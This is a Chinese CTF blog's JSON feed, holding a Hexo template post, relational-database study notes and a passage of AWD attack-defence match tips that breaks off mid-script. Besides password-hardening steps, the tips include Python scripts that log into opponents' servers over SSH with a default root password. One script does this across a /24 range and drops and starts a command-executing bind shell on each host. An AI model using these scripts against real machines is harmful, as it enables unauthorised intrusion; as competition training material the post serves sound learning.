{
    "version": "https://jsonfeed.org/version/1",
    "title": "",
    "subtitle": "",
    "icon": "https://blog.xcu.icu/images/favicon.ico",
    "description": "一个想要全栈的 CTFer，目前是个废物",
    "home_page_url": "https://blog.xcu.icu",
    "items": [
        {
            "id": "https://blog.xcu.icu/2022/10/24/hello-world/",
            "url": "https://blog.xcu.icu/2022/10/24/hello-world/",
            "title": "Hello World",
            "date_published": "2022-10-24T12:08:56.290Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<p><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ hexo new <span class=\"token string\">\"My New Post\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<p><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ hexo server<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<p><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ hexo generate<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<p><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ hexo deploy<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/",
            "url": "https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/",
            "title": "关系数据库",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<p>[TOC]</p>\n<h2 id=\"21关系数据库结构及形式化定义\"><a class=\"anchor\" href=\"#21关系数据库结构及形式化定义\">#</a> 2.1 关系数据库结构及形式化定义</h2>\n<h3 id=\"211关系\"><a class=\"anchor\" href=\"#211关系\">#</a> 2.1.1 关系</h3>\n<p>单一的数据结构 -- 关系</p>\n<ul>\n<li>现实世界的实体以及实体之间的关系均用关系来表示</li>\n</ul>\n<p>逻辑结构 --- 二维表</p>\n<ul>\n<li>从用户角度，关系模型中数据的逻辑结构是一张二维表</li>\n</ul>\n<h4 id=\"域\"><a class=\"anchor\" href=\"#域\">#</a> 域</h4>\n<p>域是一组具有相同数据类型的值的集合</p>\n<ul>\n<li>整数、实数、自然数</li>\n<li>某一个范围的数</li>\n<li>指定长度的字符串集合</li>\n<li ’男‘，‘女’=\"\"></li>\n</ul>\n<h4 id=\"笛卡尔积\"><a class=\"anchor\" href=\"#笛卡尔积\">#</a> 笛卡尔积</h4>\n<ul>\n<li>\n<p>笛卡尔积</p>\n<p>给定一组域 D1，D2，…，Dn，这些域中可以有相同的。    D1，D2，…，Dn 的笛卡尔积为：    D1×D2×…×Dn ＝ ｛（d1，d2，…，dn）｜diDi，i＝1，2，…，n</p>\n<ol>\n<li>所有域的所有取值的一个组合</li>\n<li>不能重复</li>\n</ol>\n</li>\n<li>\n<p>元组</p>\n<p>笛卡尔积中每一个元素（d1，d2，…，dn）叫作一个 n 元组（n-tuple）或简称元组 (Tuple)</p>\n</li>\n<li>\n<p>分量</p>\n<p>笛卡尔积元素（d1，d2，…，dn）中的每一个值 di 叫作一个分量</p>\n</li>\n<li>\n<p>基数</p>\n<p>若 Di（i＝1，2，…，n）为有限集，其基数 (域中所包含的值的个数) 为 mi（i＝1，2，…，n），则 D1×D2×…×Dn 的基数 M 为：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220918183227871.png\" alt=\"image-20220918183227871\" /></p>\n</li>\n<li>\n<p>笛卡尔积的表示方法</p>\n<ul>\n<li>笛卡尔积可以表示为一个二维表</li>\n<li>表中的每行对应一个元组，表中的每列对应一个域</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"关系\"><a class=\"anchor\" href=\"#关系\">#</a> 关系</h4>\n<ol>\n<li>\n<p>关系<br />\n D1×D2×…×Dn 的子集叫作在域 D1，D2，…，Dn 上的关系，表示为 ：<br />\nR（D1，D2，…，Dn）</p>\n<ul>\n<li>\n<p>关系名</p>\n</li>\n<li>\n<p>关系的目或者度</p>\n</li>\n</ul>\n</li>\n<li>\n<p>单元关系于二元关系</p>\n<ul>\n<li>当 n=1 时，称该关系为单元关系或者一元关系</li>\n</ul>\n</li>\n<li>\n<p>关系的表示</p>\n<p>关系也是一个二维表，表的每行对应一个元组，表的每列对应一个域</p>\n</li>\n<li>\n<p>属性</p>\n<ul>\n<li>关系中不同列可以对应相同的域</li>\n<li>为了加以区分，必须对每列起一个名字，称为属性（Attribute）名</li>\n<li>n 目关系必有 n 个属性</li>\n</ul>\n</li>\n<li>\n<p>码</p>\n<ul>\n<li>候选码（Candidate key）：若关系中的某一属性组的值能唯一地标识一个元组，则称该属性组为候选码</li>\n<li>全码（All-key）：关系模式的所有属性是这个关系模式的候选码，称为全码</li>\n<li>主码（Primary key）：若一个关系有多个候选码，则选定其中一个为主码</li>\n<li>外部码：不是当前关系的码，但是其它关系的主码</li>\n<li>主属性：包含在任何候选码中的属性称为主属性。</li>\n<li>非主属性：不包含在任何侯选码中的属性称为非主属性（ Non-Prime attribute）或非码属性（Non-key attribute）</li>\n</ul>\n</li>\n<li>\n<p>三类关系</p>\n<ul>\n<li>\n<p>基本关系（基本表或者基表）</p>\n<p>实际存在的表，是实际存储数据的逻辑表示</p>\n</li>\n<li>\n<p>查询表</p>\n<p>查询结果对应的表</p>\n</li>\n<li>\n<p>视图表</p>\n<p>由基本表或者其他识图表导出的表，是虚表，不对应实际的数据</p>\n</li>\n</ul>\n</li>\n<li>\n<p>基本关系的性质</p>\n<ul>\n<li>列是同质的</li>\n<li>不同的列可以出自一个域<br />\n其中每个列称为一个属性<br />\n不同的属性要给与不同的属性名</li>\n<li>列的顺序无所谓，列的次序可以任意交换</li>\n<li>任意两个元组的候选码不能相同</li>\n<li>行的顺序无所谓，行的次序可以任意交换</li>\n<li>分量必须取原子值（最基本的）</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"222-关系模式\"><a class=\"anchor\" href=\"#222-关系模式\">#</a> 2.2.2、关系模式</h3>\n<h4 id=\"什么是关系模型\"><a class=\"anchor\" href=\"#什么是关系模型\">#</a> 什么是关系模型</h4>\n<p>关系模式（型）</p>\n<ul>\n<li>对关系的描述</li>\n<li>静态的稳定的</li>\n</ul>\n<p>关系（值）</p>\n<ul>\n<li>关系模式在某一个时刻的状态或者内容</li>\n<li>动态的，随时间变化的</li>\n</ul>\n<p>关系是元组的集合，因此关系模式必须指出这个元组集合的结构，即它由哪些组成，这些属性来自哪些域，以及属性与域之间的映像关系。</p>\n<h4 id=\"定义关系模型\"><a class=\"anchor\" href=\"#定义关系模型\">#</a> 定义关系模型</h4>\n<p>关系模式可以形式化的表示为：</p>\n<p>​\tR（U，D，DOM，F）</p>\n<ul>\n<li>\n<p>R       关系名</p>\n</li>\n<li>\n<p>U       组成该关系的属性名集合</p>\n</li>\n<li>\n<p>D       属性组 U 中属性所来自的域</p>\n</li>\n<li>\n<p>DOM  属性向域的映象集合</p>\n</li>\n<li>\n<p>F        属性间的数据依赖关系集合</p>\n</li>\n</ul>\n<p>关系定义模式通常可以简记为</p>\n<p>R(U)</p>\n<p>关系模式何关系往往统称为关系</p>\n<h4 id=\"关系模型的存储结构\"><a class=\"anchor\" href=\"#关系模型的存储结构\">#</a> 关系模型的存储结构</h4>\n<ul>\n<li>关系模型的逻辑结构 - 表</li>\n<li>关系模型的物理结构\n<ol>\n<li>有的关系数据库管理中一个表对应一个操作系统文件，将物理数据组织交给操作系统完成；</li>\n<li>有的关系数据库系统从操作系统那里申请若干个大的文件，自己划分文件空间，组织表，索引等存储结构，并进行存储管理。</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"223关系数据库\"><a class=\"anchor\" href=\"#223关系数据库\">#</a> 2.2.3 关系数据库</h3>\n<p>在一个给定的应用领域中，所有关系的集合构成一个关系数据库</p>\n<p>关系数据库也有型和值之分</p>\n<h2 id=\"22关系操作\"><a class=\"anchor\" href=\"#22关系操作\">#</a> 2.2 关系操作</h2>\n<h3 id=\"221-基本关系操作\"><a class=\"anchor\" href=\"#221-基本关系操作\">#</a> 2.2.1、基本关系操作</h3>\n<ol>\n<li>常用的关系操作\n<ul>\n<li>查询：选择、投影、连接、除、并、交、差、笛卡尔积</li>\n<li>数据更新：插入、删除、修改</li>\n<li>选择、投影、并、差、笛卡尔积是 5 种基本操作</li>\n</ul>\n</li>\n<li>关系操作的特点\n<ul>\n<li>集合操作方式：操作的对象和结果都是集合，一次一集合的方式</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"222-关系数据库语言的分类\"><a class=\"anchor\" href=\"#222-关系数据库语言的分类\">#</a> 2.2.2、关系数据库语言的分类</h3>\n<ol>\n<li>\n<p>关系代数语言</p>\n<ul>\n<li>用对关系的运算来表达查询要求</li>\n<li>代表 ISBL</li>\n</ul>\n</li>\n<li>\n<p>关系演算语言：用谓词来表达查询要求</p>\n<ul>\n<li>\n<p>元组关系演算语言<br />\n谓词变元的基本对象是元组变量</p>\n<p>代表：APLHA, QUEL</p>\n</li>\n<li>\n<p>域关系演算语言</p>\n<p>谓词变元的基本对象是域变量</p>\n<p>代表：QBE</p>\n</li>\n</ul>\n</li>\n<li>\n<p>介于关系代数何关系演算之间的语言</p>\n<ul>\n<li>代表 SQL</li>\n</ul>\n</li>\n</ol>\n<p>每一个 ISBL 语句都近似于关系代数表达式<br />\n关系代数、关系演算语言均是抽象的查询语言，这些抽象的语言与具体的关系数据库管理系统中实现的实际语言并不完全一样。但它们能用作评估实际系统中查询语言能力的标准或基础。</p>\n<h2 id=\"23关系的完整性\"><a class=\"anchor\" href=\"#23关系的完整性\">#</a> 2.3 关系的完整性</h2>\n<h3 id=\"231-关系的三类完整性约束\"><a class=\"anchor\" href=\"#231-关系的三类完整性约束\">#</a> 2.3.1 关系的三类完整性约束</h3>\n<ol>\n<li>实体完整性何参照完整性<br />\n关系模型必须满足的完整性约束条件，称为关系的两个不变性，应该由关系系统自动支持</li>\n<li>用户定义完整性<br />\n应用领域需要遵循的约束条件，体现了具体领域中的语义约束</li>\n</ol>\n<h3 id=\"232-实体完整性\"><a class=\"anchor\" href=\"#232-实体完整性\">#</a> 2.3.2 实体完整性</h3>\n<p>(1) 实体完整性规则是针对基本关系而言的。一个基本表通常对应现实世界的一个实体集。</p>\n<p>(2) 现实世界中的实体是可区分的，即它们具有某种唯一性标识。</p>\n<p>(3) 关系模型中以主码作为唯一性标识。</p>\n<p>(4) 主码中的属性即主属性不能取空值。</p>\n<h3 id=\"233-参照完整性\"><a class=\"anchor\" href=\"#233-参照完整性\">#</a> 2.3.3 参照完整性</h3>\n<ol>\n<li>\n<p>关系间的引用</p>\n<p>在关系模型中实体及实体间的联系都是用关系来描     述的，因此可能存在着关系与关系间的引用。</p>\n</li>\n<li>\n<p>外码<br />\n外码：设 F 是基本关系 R 的一个或一组属性，但不是关系 R 的码。如果 F 与基本关系 S 的主码 Ks 相对应，则称 F 是基本关系 R 的外码。</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">基本关系R称为参照关系\n基本关系S称为被参照关系或目标关系<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>参照完整性规则<br />\n若属性（或属性组）F 是基本关系 R 的外码，它与基本关系 S 的主码 Ks 相对应（基本关系 R 和 S 不一定是不同的关系），则对于 R 中每个元组在 F 上的值必须为：<br />\n或者取空值（F 的每个属性值均为空值）<br />\n或者等于 S 中某个元组的主码值</p>\n</li>\n</ol>\n<h3 id=\"234-用户定义的完整性\"><a class=\"anchor\" href=\"#234-用户定义的完整性\">#</a> 2.3.4 用户定义的完整性</h3>\n<ul>\n<li>针对某一具体关系数据库的约束条件，反映某一具体应用所涉及的数据必须满足的语义要求</li>\n<li>关系模型应提供定义和检验这类完整性的机制，以便用统一的系统的方法处理它们，而不要由应用程序承担这一功能</li>\n</ul>\n<h2 id=\"24关系代数\"><a class=\"anchor\" href=\"#24关系代数\">#</a> 2.4 关系代数</h2>\n<p>关系代数</p>\n<ul>\n<li>一种抽象的查询语言</li>\n<li>用对关系的运算来表达查询</li>\n</ul>\n<p>关系代数的三个要素</p>\n<ul>\n<li>运算对象：关系</li>\n<li>运算结果：关系</li>\n<li>运算符：4 类</li>\n</ul>\n<p>集合运算符（）&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzQ3NTc2NjYucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923174757666.png</span>&quot; alt=&quot;image-20220923174757666&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<ul>\n<li>将关系看成元组的集合</li>\n<li>运算是从关系的 “水平” 方向即行的角度来进行</li>\n</ul>\n<p>专门的关系运算符 &lt; img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzUwMDc3ODYucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923175007786.png</span>&quot; alt=&quot;image-20220923175007786&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<ul>\n<li>不仅涉及行而且涉及列</li>\n</ul>\n<p>关系代数运算的分类</p>\n<ul>\n<li>\n<p>传统的集合运算</p>\n<p>并、差、交、广义笛卡尔积</p>\n</li>\n<li>\n<p>专门的关系运算</p>\n<p>选择、投影、连接、除</p>\n</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/",
            "url": "https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/",
            "title": "Awd-web小结",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"查看比赛信息-规则\"><a class=\"anchor\" href=\"#查看比赛信息-规则\">#</a> 查看比赛信息、规则</h2>\n<p>注意赛方的限制比如说提交 flag 的间隔时间，flag 的获取方式，通防的限制，对后门的处理要求等要注意的点，避免 check 丢分</p>\n<h2 id=\"改密码\"><a class=\"anchor\" href=\"#改密码\">#</a> 改密码</h2>\n<p>awd 模式每个队伍会有若干台服务器需要维护，如果主办方平台给的密码较为简单存在弱口令或者可能被爆破成功的机会，尽快修改密码，密码主要是三个方面：</p>\n<ul>\n<li>ssh 连接密码即本地密码</li>\n</ul>\n<p><pre class=\"line-numbers language-ABAP\" data-language=\"ABAP\"><code class=\"language-ABAP\">passwd &#123;用户名&#125;\n做修改即可<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<ul>\n<li>MySQL 登录密码</li>\n</ul>\n<p><pre class=\"line-numbers language-apl\" data-language=\"apl\"><code class=\"language-apl\"><span class=\"token number\">1</span><span class=\"token dyadic-operator operator\">.</span> 使用 SET PASSWORD 命令\n步骤 <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>：输入命令mysql <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。\n\n步骤 <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>：使用 SET PASSWORD 修改密码命令格式为 set password for username <span class=\"token dyadic-operator operator\">@</span>localhost <span class=\"token function\">=</span> password<span class=\"token punctuation\">(</span>newpwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n，其中 username 为要修改密码的用户名，newpwd 为要修改的新密码。\n\n<span class=\"token number\">2</span><span class=\"token dyadic-operator operator\">.</span> 使用mysqladmin修改密码\n使用 mysqladmin 命令修改 MySQL 的 root 用户密码格式为 mysqladmin <span class=\"token function\">-</span>u用户名 <span class=\"token function\">-</span>p旧密码 password 新密码。\n\n注意：修改密码的命令中 <span class=\"token function\">-</span>uroot 和 <span class=\"token function\">-</span>proot 是整体，不要写成 <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>p root，<span class=\"token function\">-</span>u 和 root 间可以加空格，但是会有警告出现，所以就不要加空格了。\n\n<span class=\"token number\">3</span><span class=\"token dyadic-operator operator\">.</span> UPDATE直接编辑user表\n步骤 <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>：输入命令mysql <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。\n\n步骤 <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>：输入use mysql<span class=\"token punctuation\">;</span>命令连接权限数据库。\n\n步骤 <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>：输入命令update mysql<span class=\"token dyadic-operator operator\">.</span>user set authentication_string<span class=\"token function\">=</span>password<span class=\"token punctuation\">(</span><span class=\"token string\">'新密码'</span><span class=\"token punctuation\">)</span> where user<span class=\"token function\">=</span><span class=\"token string\">'用户名'</span> and Host <span class=\"token function\">=</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">;</span>设置新密码。\n\n步骤 <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>：输入 flush privileges<span class=\"token punctuation\">;</span> 命令刷新权限。\n\n步骤 <span class=\"token number\">5</span><span class=\"token punctuation\">)</span>：输入quit<span class=\"token punctuation\">;</span>命令退出 MySQL 重新登录，此时密码已经修改为刚才输入的新密码了。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<ul>\n<li>后台的登录密码</li>\n</ul>\n<p><pre class=\"line-numbers language-ASN.1\" data-language=\"ASN.1\"><code class=\"language-ASN.1\">updata admin set user pass&#x3D;’123456’;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>如果密码是默认的尝试别人的能否登录</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#-*- coding:utf-8 -*-</span>\n<span class=\"token keyword\">import</span> paramiko\n\nip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.1.137'</span>\nport <span class=\"token operator\">=</span> <span class=\"token string\">'22'</span>\nusername <span class=\"token operator\">=</span> <span class=\"token string\">'root'</span>\npasswd <span class=\"token operator\">=</span> <span class=\"token string\">'toor'</span>\n<span class=\"token comment\"># ssh 用户名 密码 登陆</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">ssh_base_pwd</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token operator\">=</span><span class=\"token string\">'ls'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span>\n    ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>hostname<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>username<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span>\n\n    stdin<span class=\"token punctuation\">,</span>stdout<span class=\"token punctuation\">,</span>stderr <span class=\"token operator\">=</span> ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span>\n\n    result <span class=\"token operator\">=</span> stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> result <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"无结果!\"</span><span class=\"token punctuation\">)</span>\n        result <span class=\"token operator\">=</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ssh<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \na <span class=\"token operator\">=</span> ssh_base_pwd<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>如果可以登录而且有 python 环境可以尝试使用下面这个 python 批量 ssh 登录并反弹 python shell</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#-*- coding:utf-8 -*-</span>\n<span class=\"token keyword\">import</span> paramiko\n<span class=\"token keyword\">import</span> threading\n<span class=\"token keyword\">import</span> queue\n<span class=\"token keyword\">import</span> time\n<span class=\"token comment\">#反弹 shell python</span>\n\nq<span class=\"token operator\">=</span>queue<span class=\"token punctuation\">.</span>Queue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#lock = threading.Lock()</span>\n\n<span class=\"token comment\"># ssh 用户名 密码 登陆</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">ssh_base_pwd</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span>\n    ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>hostname<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>username<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span>\n\n    stdin<span class=\"token punctuation\">,</span>stdout<span class=\"token punctuation\">,</span>stderr <span class=\"token operator\">=</span> ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span>\n\n    result <span class=\"token operator\">=</span> stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> result <span class=\"token punctuation\">:</span>\n        result <span class=\"token operator\">=</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ssh<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    shell <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\n    #服务器端\n    import socket\n    import os\n    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\n    s.bind(('0.0.0.0',1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接\n    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量\n    con,addr=s.accept()     #接受一个客户端的连接\n    #print(con,addr)\n\n    for i in range(10):\n        cmd=con.recv(1024)\n        print(cmd)\n        command=cmd.decode()\n        if command.startswith('cd'):\n            os.chdir(command[2:].strip())   #切换路径\n            result=os.getcwd()      #显示路径\n        else:\n            result=os.popen(command).read()\n        if result:\n            con.send(result.encode())\n        else:\n            con.send(b'OK!')\n    '''</span>\n    cmd <span class=\"token operator\">=</span> <span class=\"token string\">'echo \\\"%s\\\" > ./shell.py'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">'&amp;&amp; python3 ./shell.py'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'22'</span>\n    username <span class=\"token operator\">=</span> <span class=\"token string\">'root'</span>\n    passwd <span class=\"token operator\">=</span> <span class=\"token string\">'toor'</span>\n    \n    ip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.1.&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n    q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>block<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span>\n    ip_demo<span class=\"token operator\">=</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#判断是否成功</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#lock.acquire()</span>\n        res <span class=\"token operator\">=</span> ssh_base_pwd<span class=\"token punctuation\">(</span>ip_demo<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token operator\">=</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ + ]Ip: %s\"</span> <span class=\"token operator\">%</span> ip_demo <span class=\"token operator\">+</span><span class=\"token string\">\" is success!!! [ + ]\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#lock.release()</span>\n            